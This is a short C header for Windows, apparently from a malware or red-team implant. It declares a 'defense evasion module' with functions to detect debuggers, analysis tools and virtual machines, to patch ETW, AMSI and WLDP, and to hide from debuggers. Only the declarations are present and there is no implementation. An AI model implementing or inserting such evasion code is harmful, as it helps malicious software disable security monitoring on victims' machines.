#pragma once
#ifndef DEFENSE_H
#define DEFENSE_H
#include <windows.h>
#include <stdbool.h>

/* ============================================================
 * DEFENSE EVASION MODULE
 * Patches EDR/monitoring systems and detects analysis environments
 * ============================================================ */

/* Phase 1: Anti-Analysis Detection */
bool DefenseCheckDebugger(void);
bool DefenseDetectAnalysisTools(void);
bool DefenseDetectVirtualMachine(void);

/* Phase 2: Defense System Patching */
bool DefensePatchETW(void);           /* Disable Event Tracing for Windows */
bool DefensePatchAMSI(void);          /* Bypass AMSI scanning */
bool DefensePatchWLDP(void);          /* Bypass Windows Lockdown Policy */

/* Phase 3: Runtime Hiding */
bool DefenseHideFromDebugger(void);

/* Phase 4: Cleanup & Reporting */
void DefenseResetSecurityChecks(void);

#endif
